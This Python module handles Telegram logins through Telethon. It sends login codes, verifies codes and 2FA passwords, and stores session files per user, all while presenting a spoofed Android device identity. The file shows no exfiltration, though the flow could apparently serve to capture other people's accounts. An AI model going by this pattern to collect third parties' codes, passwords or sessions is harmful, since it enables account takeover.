import asyncio
import logging
import time
from typing import Dict, Any
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, PhoneCodeExpiredError
from config import config
from utils import sanitize_log_input

class AuthManager:
    def __init__(self):
        self.pending_auth = {}
        self.active_clients = {}
        self.client_loops = {}

    def start_phone_auth(self, user_id: int, phone: str) -> Dict[str, Any]:
        try:
            phone = str(phone)
            phone_digits = ''.join(ch for ch in phone if ch.isdigit())
            
            session_name = f"auth_{user_id}_{phone_digits}"
            session_path = f"sessions/{session_name}.session"
            
            api_id = int(config.get('api_id'))
            api_hash = config.get('api_hash')
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            client = TelegramClient(
                session_path, 
                api_id, 
                api_hash,
                device_model="Samsung SM-G973F",
                system_version="Android 10",
                app_version="8.4.1",
                lang_code="en",
                system_lang_code="en",
                flood_sleep_threshold=0,
                auto_reconnect=False
            )
            
            loop.run_until_complete(client.connect())
            sent_code = loop.run_until_complete(client.send_code_request(phone))
            
            # Store client and loop for reuse
            self.active_clients[user_id] = client
            self.client_loops[user_id] = loop
            
            self.pending_auth[user_id] = {
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash,
                'session_path': session_path,
                'session_name': session_name,
                'step': 'code',
                'request_time': time.time()
            }
            
            return {
                'success': True,
                'step': 'code',
                'message': f'Code sent to {phone}. Please enter the verification code.'
            }
                
        except Exception as e:
            logging.error(f"Phone auth error: {e}")
            return {'success': False, 'error': str(e)}

    def verify_code(self, user_id: int, code: str) -> Dict[str, Any]:
        if user_id not in self.pending_auth:
            return {'success': False, 'error': 'No pending authentication'}
        
        try:
            auth_data = self.pending_auth[user_id]
            
            # Check if enough time has passed since code request (minimum 10 seconds)
            time_since_request = time.time() - auth_data.get('request_time', 0)
            if time_since_request < 10:
                wait_time = int(10 - time_since_request)
                return {'success': False, 'error': f'Please wait {wait_time} more seconds before entering the code'}
            
            # Reuse existing client and loop
            if user_id not in self.active_clients:
                return {'success': False, 'error': 'Client session lost. Please restart authentication.'}
            
            client = self.active_clients[user_id]
            loop = self.client_loops[user_id]
            
            try:
                result = loop.run_until_complete(client.sign_in(
                    phone=auth_data['phone'],
                    code=code,
                    phone_code_hash=auth_data['phone_code_hash']
                ))
                
                me = loop.run_until_complete(client.get_me())
                
                # Clean up
                self._cleanup_client(user_id)
                
                return {
                    'success': True,
                    'step': 'complete',
                    'user_info': {
                        'id': me.id,
                        'name': f"{me.first_name or ''} {me.last_name or ''}".strip(),
                        'username': me.username,
                        'phone': me.phone
                    }
                }
            except Exception as e:
                # Don't cleanup on error, allow retry
                raise e
                
        except SessionPasswordNeededError:
            auth_data['step'] = '2fa'
            return {'success': True, 'step': '2fa', 'message': 'Enter 2FA password'}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'The confirmation code has expired', 'expired': True}
        except Exception as e:
            error_msg = str(e).lower()
            if 'expired' in error_msg or 'timeout' in error_msg or 'previously shared' in error_msg:
                return {'success': False, 'error': 'Code expired or already used. Please request a new code.', 'expired': True}
            logging.error(f"Code verify error: {e}")
            return {'success': False, 'error': str(e)}

    def verify_2fa(self, user_id: int, password: str) -> Dict[str, Any]:
        if user_id not in self.pending_auth:
            return {'success': False, 'error': 'No pending authentication'}
        
        try:
            auth_data = self.pending_auth[user_id]
            
            api_id = int(config.get('api_id'))
            api_hash = config.get('api_hash')
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            client = TelegramClient(
                auth_data['session_path'], 
                api_id, 
                api_hash,
                device_model="Samsung SM-G973F",
                system_version="Android 10",
                app_version="8.4.1",
                lang_code="en",
                system_lang_code="en"
            )
            
            try:
                with client:
                    result = loop.run_until_complete(client.sign_in(password=password))
                    me = loop.run_until_complete(client.get_me())
                    self.pending_auth.pop(user_id, None)
                    
                    return {
                        'success': True,
                        'step': 'complete',
                        'user_info': {
                            'id': me.id,
                            'name': f"{me.first_name or ''} {me.last_name or ''}".strip(),
                            'username': me.username,
                            'phone': me.phone
                        }
                    }
            finally:
                loop.close()
                
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            logging.error(f"2FA verify error: {e}")
            return {'success': False, 'error': str(e)}

    def _cleanup_client(self, user_id: int):
        """Clean up client and loop resources"""
        if user_id in self.active_clients:
            try:
                client = self.active_clients[user_id]
                loop = self.client_loops[user_id]
                loop.run_until_complete(client.disconnect())
                loop.close()
            except:
                pass
            self.active_clients.pop(user_id, None)
            self.client_loops.pop(user_id, None)
        self.pending_auth.pop(user_id, None)
    
    def cancel_auth(self, user_id: int) -> bool:
        if user_id in self.pending_auth:
            auth_data = self.pending_auth[user_id]
            try:
                import os
                if os.path.exists(auth_data['session_path']):
                    os.remove(auth_data['session_path'])
            except:
                pass
            self._cleanup_client(user_id)
            return True
        return False
    
    def resend_code(self, user_id: int) -> Dict[str, Any]:
        if user_id not in self.pending_auth:
            return {'success': False, 'error': 'No pending authentication'}
        
        auth_data = self.pending_auth[user_id]
        phone = auth_data['phone']
        
        # Cancel current auth and start fresh
        self.cancel_auth(user_id)
        return self.start_phone_auth(user_id, phone)

auth_manager = AuthManager()